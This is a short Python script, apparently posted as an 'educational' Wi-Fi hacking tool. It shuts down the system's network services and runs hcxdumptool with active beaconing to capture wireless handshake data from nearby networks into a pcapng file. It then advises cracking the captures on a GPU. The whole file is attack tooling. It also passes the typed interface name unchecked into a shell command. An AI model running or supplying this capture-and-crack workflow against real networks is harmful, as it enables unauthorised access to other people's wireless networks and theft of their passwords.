#!/usr/bin/env python3
# Author: AuxGrep
# Only for educational purposes !!! Don't misuase

import os
import time
import urllib.request
import subprocess
import sys

# enter your external wifi adapter interface without monitoring mode enabled eg: wlan1
wifimonitor = input('syntx card interface: ')

# Now let's check if your pc is connected with internet
def network_manager(web='https://google.com'):
	try:	
		urllib.request.urlopen(web)
		return True
	except:
		return False

# if connected !! let's disconnect it by stopping some services
if network_manager():
	os.system('sudo systemctl stop NetworkManager.service')
	os.system('sudo systemctl stop wpa_supplicant.service')
	time.sleep(2)
	os.system('clear')
	print('Run Again this script')
	sys.exit()
else:

# Then let's start sniffing for Wireless Network based on your card if it is 2.4ghz or both 2.4ghz and 5ghz 
	print('Starting hcxdumptool process')

def hcxdump():
	hcxdump_file = 'recon_dumped.pcapng'
	stx = 15
	subprocess.call(f'sudo hcxdumptool -i {wifimonitor} -o {hcxdump_file} --active_beacon --enable_status={stx}', shell=True)
	subprocess.run("clear")
	print(f'All wifi data saved as {hcxdump_file}, Highly recommend to use GPU to crack captured Networks')
	print(f"Now run python3 hcx.py to convert dumped data from {hcxdump_file}")

hcxdump();





